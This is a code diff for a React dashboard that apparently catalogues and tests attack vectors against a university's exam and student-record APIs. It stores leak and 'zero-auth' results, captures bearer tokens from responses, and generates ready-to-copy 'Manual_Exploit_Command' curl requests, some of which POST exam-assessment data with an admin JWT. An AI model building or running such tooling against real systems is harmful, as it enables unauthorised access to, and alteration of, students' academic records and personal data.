@@ -3,6 +3,8 @@
 import { useState, useMemo } from 'react';
 import dvs1DataRaw from './leak_report.json';
 import coeDataRaw from './coe_audit_pubapi_results.json';
+import coeZeroAuthRaw from './coe_zero_auth_results.json';
+
 
 interface LeakItem {
   action: string;
@@ -15,6 +17,8 @@ interface LeakItem {
 
 const dvs1Data = dvs1DataRaw as LeakItem[];
 const coeData = coeDataRaw as LeakItem[];
+const coeZeroAuth = coeZeroAuthRaw as any[];
+
 
 const SHREK_ASCII = `⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀ ⣀⣀⣤⣤⣤⣀⡀
 ⠸⡇⠀⠿⡀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀
@@ -66,6 +70,8 @@ export default function Home() {
   const [showMascots, setShowMascots] = useState(false);
   const [userRegNo, setUserRegNo] = useState('20241BCI0249');
   const [environment, setEnvironment] = useState<'DVS1' | 'COE'>('DVS1');
+  const [lastToken, setLastToken] = useState<string | null>(null);
+
 
   const leakData = environment === 'DVS1' ? dvs1Data : coeData;
 
@@ -130,7 +136,11 @@ export default function Home() {
 
       if (result) {
         setData(result);
+        if (result.data && result.data.token) {
+          setLastToken(result.data.token);
+        }
       } else {
+
         setError('No records found for this vector.');
       }
     } catch (err) {
@@ -160,10 +170,26 @@ export default function Home() {
   };
 
   const getVectorStatus = (item: any) => {
+    // Check main status first
     if (item.status === 'RESTRICTED') return 'RESTRICTED';
     if (item.status === 'FAILURE') return 'FAILURE';
-    if (item.response?.status === 'failure' || item.response?.error_code === -1) return 'FAILURE';
-    if (item.data?.status === 'Failure' || item.data?.status === 'failure' || item.data?.error_code === -1) return 'FAILURE';
+    
+    const res = item.response || item.data || item;
+    const innerData = res.data;
+    
+    // Check for "Soft Success" (Logical hits that return "Failure" status)
+    const rawDataStr = JSON.stringify(item).toLowerCase();
+    const isLogicalHit = rawDataStr.includes("marks are empty") || 
+                        rawDataStr.includes("invalid register no.") ||
+                        rawDataStr.includes("data not available") ||
+                        rawDataStr.includes("register no. empty") ||
+                        rawDataStr.includes("inserted successfully");
+
+    if (isLogicalHit) return 'SUCCESS';
+
+    if (res.status === 'failure' || res.error_code === -1) return 'FAILURE';
+    if (innerData?.status === 'Failure' || innerData?.status === 'failure' || innerData?.error_code === -1) return 'FAILURE';
+    
     return 'SUCCESS';
   };
 
@@ -198,6 +224,39 @@ export default function Home() {
     }
     return 'bg-transparent text-white/40 border-white/10';
   };
+
+  const getDynamicCurl = (item: any) => {
+    if (environment === 'DVS1') {
+      return `curl -X GET "https://dvs1.pgi-intraconnect.in/tdvs-php/app.php?a=${activeVector}&univcode=064&fteachcode=1&fbarcode=1&fmobile=9876543210&fyear=2024"`;
+    }
+
+    const token = lastToken || '<ADMIN_JWT_TOKEN>';
+    const action = item.action || activeVector;
+    const params = item.params || {};
+    const category = item.category || 'STUDENT';
+    const isGet = category === 'AUTH' || category === 'DOWNLOAD';
+
+    // Check if it's zero-auth
+    const zeroAuthMatch = coeZeroAuth.find(z => z.action === action);
+    const isZeroAuth = zeroAuthMatch && !zeroAuthMatch.isProtected;
+
+    let url = `https://coe.pgi-intraconnect.in/pubapi/app.php?a=${action}&univcode=064`;
+
+    const authHeader = isZeroAuth ? '' : ` \\\n  -H "Authorization: Bearer ${token}"`;
+
+    if (isGet) {
+      const urlParams = new URLSearchParams(params);
+      const queryString = urlParams.toString();
+      if (queryString) url += `&${queryString}`;
+      return `curl -X GET "${url}"${authHeader}`;
+    } else {
+      const payload = JSON.stringify([params]);
+      const contentTypeHeader = ` \\\n  -H "Content-Type: application/json"`;
+      return `curl -X POST "${url}"${authHeader}${contentTypeHeader} \\\n  -d '${payload}'`;
+    }
+  };
+
+
 
   return (
     <main className="min-h-screen flex flex-col items-center p-8 md:p-24 bg-black text-white selection:bg-[#ff4d4d] relative overflow-x-hidden">
@@ -301,15 +360,20 @@ export default function Home() {
           {filteredVectors.map((v, idx) => {
             const status = getVectorStatus(v);
             const isActive = activeVector === v.action;
+            const zeroAuthMatch = coeZeroAuth.find(z => z.action === v.action);
+            const isZeroAuth = zeroAuthMatch && !zeroAuthMatch.isProtected;
+            
             return (
               <button
                 key={`${v.action}-${idx}`}
                 onClick={() => handleVectorClick(v.action)}
-                className={`px-6 py-3 font-mono text-xs uppercase tracking-widest rounded-md border transition-all duration-300 flex items-center gap-2 ${getVectorColors(status, isActive)}`}
+                className={`px-6 py-3 font-mono text-xs uppercase tracking-widest rounded-md border transition-all duration-300 flex items-center gap-2 relative ${getVectorColors(status, isActive)}`}
               >
                 {v.action}
               </button>
             );
+
+
           })}
         </div>
       </div>
@@ -411,11 +475,9 @@ export default function Home() {
               <div className="flex flex-col mb-4 bg-[#ff4d4d]/5 border border-[#ff4d4d]/20 rounded-lg p-4 mx-4">
                 <span className="text-[10px] text-[#ff4d4d] font-mono mb-2 uppercase tracking-widest font-bold">Manual_Exploit_Command:</span>
                 <code className="text-[10px] text-[#00ff00]/70 font-mono break-all select-all block bg-black p-3 rounded border border-white/5">
-                  {environment === 'COE' 
-                    ? `curl -X POST "https://coe.pgi-intraconnect.in/pubapi/app.php?a=${activeVector}&univcode=064" \\\n  -H "Authorization: Bearer <ADMIN_JWT_TOKEN>" \\\n  -H "Content-Type: application/json" \\\n  -d '[{"regno": "20251BAE0001", "subject": "PSY1001", "school": "SCHOOL OF LIBERAL ARTS AND SCIENCES", "term": "S1", "programLevel": "UG", "batchStartYear": "2025", "assessmentType": "3. End-Term Exam", "assessmentInstance": "End-Term Exam"}]'`
-                    : `curl -X GET "https://dvs1.pgi-intraconnect.in/tdvs-php/app.php?a=${activeVector}&univcode=064&fteachcode=1&fbarcode=1&fmobile=9876543210&fyear=2024"`
-                  }
+                  {getDynamicCurl(data)}
                 </code>
+
               </div>
 
               <pre className="text-xs font-mono text-[#00ff00] overflow-x-auto whitespace-pre-wrap p-4 mx-4 mb-4 bg-white/[0.02] rounded-lg border border-white/5">
@@ -495,7 +557,7 @@ export default function Home() {
 
           {/* Generate Token New */}
           <div 
-            onClick={() => handlePubApiQuery('genrateTokennew')}
+            onClick={() => handlePubApiQuery('genrateTokennew', { univcode: '064', regno: '20251BAE0001' })}
             className="glass-panel p-8 border-t-4 border-t-[#00ff00] hover:translate-y-[-4px] transition-all cursor-pointer group"
           >
             <div className="flex justify-between items-start mb-6">
